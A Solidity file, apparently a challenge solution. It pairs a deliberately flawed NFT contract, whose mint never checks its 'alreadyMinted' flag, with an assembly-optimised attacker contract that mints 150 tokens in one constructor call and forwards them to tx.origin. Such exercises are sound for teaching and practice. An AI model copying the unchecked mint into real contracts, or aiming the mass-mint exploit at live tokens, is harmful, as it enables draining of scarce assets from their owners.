//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "openzeppelin-contracts/token/ERC721/ERC721.sol";

// You may not modify this contract or the openzeppelin contracts
contract NotRareToken is ERC721 {
    mapping(address => bool) private alreadyMinted;

    uint256 private totalSupply;

    constructor() ERC721("NotRareToken", "NRT") {}

    function mint() external {
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        alreadyMinted[msg.sender] = true;
    }
}

// contract OptimizedAttacker {
//     constructor(address victim) payable {
//         unchecked {
//             uint256 start = 1;
//             while (true) {
//                 ++start;
//                 (bool success, ) = address(victim).staticcall(
//                     abi.encodeWithSelector(
//                         ERC721.ownerOf.selector, 
//                         start
//                     )
//                 );
//                 if (!success) break;   
//             }
//             uint256 end = start + 150;
//             NotRareToken(victim).mint();
//             for (uint256 i = start + 1; i != end; ++i) {
//                 NotRareToken(victim).mint();
//                 NotRareToken(victim).transferFrom(address(this), tx.origin, i);
//             }
//             NotRareToken(victim).transferFrom(address(this), tx.origin, start);
//         }
//     }
// }

contract OptimizedAttacker {
    constructor(address victim) payable {
        assembly {
            mstore(0x04, 0x1249c58b23b872dd6352211e)
            let start := 0
            // prettier-ignore
            for {} 1 {} {
                start := add(start, 1)
                mstore(0x24, start)
                // prettier-ignore
                if iszero(staticcall(gas(), victim, 0x20, 0x24, 0, 0)) {
                    mstore(0x20, address())
                    mstore(0x40, caller())
                    let end := add(start, 150)
                    let i := add(start, call(gas(), victim, 0, 0x18, 0x04, 0, 0))
                    // prettier-ignore
                    for {} 1 {} {
                        mstore(0x60, i)
                        i := add(i, call(gas(), victim, 0, 0x1c, 0x64, call(gas(), victim, 0, 0x18, 0x04, 0, 0), 0))
                        if eq(i, end) {
                            mstore(0x60, start)
                            pop(call(gas(), victim, 0, 0x1c, 0x64, 0, 0))
                            stop()
                        }
                    }
                }
            }
        }
    }
}